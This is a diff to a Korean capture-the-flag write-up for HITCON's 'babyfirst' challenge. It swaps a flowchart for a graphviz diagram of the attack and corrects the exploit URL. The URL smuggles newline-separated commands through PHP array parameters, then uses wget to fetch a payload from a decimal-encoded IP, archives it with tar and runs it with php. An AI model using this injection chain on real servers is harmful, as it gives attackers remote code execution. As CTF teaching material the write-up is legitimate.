@@ -2,23 +2,29 @@
 [HITCON] babyfirst
 ============================================================================================================
 
-.. uml::
-    
-    @startuml
+.. graphviz::
 
-    start
+    digraph G {
+        rankdir="LR";
+        node[shape="point"];
+        edge[arrowhead="none"]
 
-    :Source Analysis;
+        {
+            rank="same";
+            "client"[shape="plaintext"];
+            "client" -> step0 -> step2 -> step4 -> step6 -> step8;
+        }
 
-    :Array 취약점;
-
-    :wget을 통한 우회;
-
-    :tar을 통한 우회;
-
-    stop
-
-    @enduml
+        {
+            rank="same";
+            "server"[shape="plaintext"];
+            "server" -> step1 -> step3 -> step5 -> step7 -> step9;
+        }
+        step0 -> step1[label="index.php?args[]=a%0a&args[]=touch&args[]=test",arrowhead="normal"];
+        step3 -> step2[label="test file create",arrowhead="normal"];
+        step4 -> step5[label="index.php?args[]=a%0a&args[]=wget&args[]=3232235536",arrowhead="normal"];
+        step7 -> step6[label="@solve",arrowhead="normal"];
+    }
 
 |
 
@@ -141,11 +147,11 @@ index.html
     http://52.68.245.164/index.php?
     args[]=a%0a&
     args[]=mkdir&
-    args[]=explit%0a&
+    args[]=exploit%0a&
     args[]=cd&
     args[]=exploit%0a&
     args[]=wget&
-    args[]=32322355636%0a&
+    args[]=3232235536%0a&
     args[]=tar&
     args[]=cvf&
     args[]=archived&
@@ -156,7 +162,7 @@ index.html
     /bin/orange a%0a
     mkdir exploit%0a
     cd exploit%0a
-    wget 32322355636%0a
+    wget 3232235536%0a
     tar cvf archived exploit%0a
     php archived
 
